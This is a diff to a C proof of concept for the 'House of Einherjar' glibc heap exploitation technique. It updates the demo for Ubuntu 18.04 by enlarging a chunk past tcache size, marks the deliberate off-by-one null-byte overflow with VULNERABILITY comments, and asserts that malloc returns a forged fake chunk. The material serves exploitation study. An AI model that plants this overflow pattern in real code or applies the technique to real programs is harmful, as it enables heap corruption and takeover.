@@ -3,6 +3,7 @@
 #include <string.h>
 #include <stdint.h>
 #include <malloc.h>
+#include <assert.h>
 
 /*
    Credit to st4g3r for publishing this technique
@@ -16,8 +17,8 @@ int main()
 	setbuf(stdout, NULL);
 
 	printf("Welcome to House of Einherjar!\n");
-	printf("Tested in Ubuntu 16.04 64bit.\n");
-	printf("This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
+	printf("Tested in Ubuntu 18.04.4 64bit.\n");
+	printf("This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.\n");
 	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
 
 	uint8_t* a;
@@ -58,19 +59,21 @@ int main()
 	/* In this case it is easier if the chunk size attribute has a least significant byte with
 	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
 	 * the chunk includes the amount requested plus some amount required for the metadata. */
-	b = (uint8_t*) malloc(0xf8);
+	b = (uint8_t*) malloc(0x4f8);
 	int real_b_size = malloc_usable_size(b);
 
-	printf("\nWe allocate 0xf8 bytes for 'b'.\n");
+	printf("\nWe allocate 0x4f8 bytes for 'b'.\n");
 	printf("b: %p\n", b);
 
 	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
 	/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/
 
 	printf("\nb.size: %#lx\n", *b_size_ptr);
-	printf("b.size is: (0x100) | prev_inuse = 0x101\n");
+	printf("b.size is: (0x500) | prev_inuse = 0x501\n");
 	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
+	/* VULNERABILITY */
 	a[real_a_size] = 0; 
+	/* VULNERABILITY */
 	printf("b.size: %#lx\n", *b_size_ptr);
 	printf("This is easiest if b.size is a multiple of 0x100 so you "
 		   "don't change the size of b, only its prev_inuse bit\n");
@@ -103,8 +106,11 @@ int main()
 	//pass the size(P) == prev_size(next_chunk(P)) test. 
 	//otherwise we need to make sure that our fake chunk is up against the
 	//wilderness
+	//
 
 	printf("\nNow we can call malloc() and it will begin in our fake chunk\n");
 	d = malloc(0x200);
 	printf("Next malloc(0x200) is at %p\n", d);
+
+	assert((long)d == (long)&fake_chunk[2]);
 }
